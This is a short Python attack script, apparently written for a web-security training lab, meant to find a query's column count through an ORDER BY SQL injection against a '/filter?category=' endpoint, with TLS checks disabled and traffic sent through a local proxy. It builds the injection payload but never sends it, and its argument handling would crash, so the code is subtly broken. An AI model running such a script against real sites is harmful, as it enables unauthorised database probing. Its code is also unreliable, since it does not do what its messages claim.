import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

sql_payload = "' ORDER BY %s--" % (sys.argv[2])
exploit_sqlinjection_column_number = lambda url: len(requests.get(url + '/filter?category=Gifts' , verify=False, proxies=proxies).text.split("th>")) - 1

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[1])
        sys.exit(-1)

    print("[+] Figurung out number of columns is ...")
    number_of_columns = exploit_sqlinjection_column_number(url)
    if number_of_columns:
        print("[+] The number of columns is " + str(number_of_columns) + ".")
    else:
        print("[-] SQL injection unsuccessful!")